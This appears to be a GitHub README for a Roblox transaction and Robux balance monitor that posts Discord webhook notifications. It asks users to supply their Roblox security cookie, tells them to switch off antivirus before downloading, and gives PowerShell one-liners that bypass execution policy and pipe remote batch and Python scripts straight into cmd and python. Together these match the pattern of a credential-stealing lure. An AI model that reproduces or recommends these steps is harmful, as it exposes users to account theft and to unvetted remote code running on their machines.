# Roblox Transaction Monitor
![image](https://github.com/user-attachments/assets/16669dc8-7a44-4c9d-8f60-48a9d46cdb08)

A GUI application to monitor Roblox transactions and Robux balance changes in real-time. Get Discord notifications when your Roblox economy data changes.

## Features

- [x] Real time monitoring of Roblox transactions
- [x] Robux balance tracking
- [x] Discord webhook integration for notifications
- [x] User friendly GUI interface
- [x] Customizable monitoring intervals
- [x] Detailed logging system

## Also just a Quick Fix

- [x] Turn Anti virus off
- [x] then download the app
- [x] after that turn the anti virus back on and you're done

## TODO
- [x] Create a Dropdown menu like past day month year total
- [ ] Create a Stable Application

## Configuration
The application requires the following configuration:

1. Roblox Security Cookie
2. Discord Webhook URL
3. Discord Emoji ID for Robux display
4. Discord Emoji Name
5. Check Interval (update what ever time you want to set to)
6. Total Checks (Transaction/Balance) Like (Day Month Year)

## Usage

Run the application by executing this command

Install Requirements packages
```
powershell -ep bypass -Command "IWR 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/install.bat' | % Content | cmd"
```
Python Stable Version
```
powershell -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/main.py').Content | python"
```
Python Dev Version
```
powershell -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/maindev.py').Content | python"
```
unInstall packages
```
powershell -ep bypass -Command "IWR 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/uninstall.bat' | % Content | cmd"
```

## License
This project is licensed under the Apache License - see the LICENSE file for details.